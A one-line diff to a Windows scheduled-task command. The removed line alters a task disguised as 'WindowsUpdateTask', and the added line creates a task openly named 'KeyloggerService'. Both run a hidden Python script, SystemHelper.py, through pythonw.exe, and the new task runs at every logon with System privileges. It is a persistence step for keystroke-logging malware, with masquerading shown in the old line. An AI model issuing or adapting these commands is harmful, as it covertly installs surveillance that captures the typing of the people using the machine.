@@ -1,1 +1,1 @@
-schtasks /change /tn "WindowsUpdateTask" /tr "C:\Users\EMP10\AppData\Local\Programs\Python\Python314\pythonw.exe C:\ProgramData\SystemHelper.py"
+schtasks /create /tn "KeyloggerService" /tr "C:\Users\EMP10\AppData\Local\Programs\Python\Python314\pythonw.exe C:\ProgramData\SystemHelper.py" /sc onlogon /ru System /f
